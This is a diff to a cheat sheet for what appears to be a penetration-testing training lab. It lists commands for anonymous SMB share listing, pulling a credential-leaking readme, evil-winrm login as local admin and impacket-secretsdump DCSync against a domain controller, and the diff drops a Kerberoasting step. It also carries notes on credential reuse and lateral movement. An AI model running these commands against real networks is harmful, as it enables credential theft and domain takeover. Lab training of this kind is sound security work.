@@ -8,14 +8,16 @@
 ## Useful commands
 
 ```bash
-evil-winrm -i <ws01> -u wadmin -p '<from readme>'     # local admin
+smbclient -N -L //<ws01>/                            # anonymous listing
+smbclient -N //<ws01>/ops -c 'get readme.txt -'      # the entry leak
+evil-winrm -i <ws01> -u wadmin -p '<from readme>'    # local admin
 # ws01 readme names ws02's admin → lateral hop
-impacket-GetUserSPNs corp.pentrain.local/wadmin:'<pw>' -dc-ip <dc01> -request
-impacket-secretsdump corp.pentrain.local/svc-rep:'<pw>'@<dc02>
+impacket-secretsdump corp.pentrain.local/<da-user>:'<pw>'@<dc02>
 ```
 
 ## Concepts
 
 - Local admin creds reused across workstations → hop laterally
-- A DA service account (svc-rep) cracked once opens DCSync on the replica
-- Check Desktop + C:\ops on every box — ops scripts leak the next hop
+- A DA service account's creds open DCSync on both DCs — one domain
+- Anonymous shares on a workstation are rare — enumerate every host, not
+  just the DCs
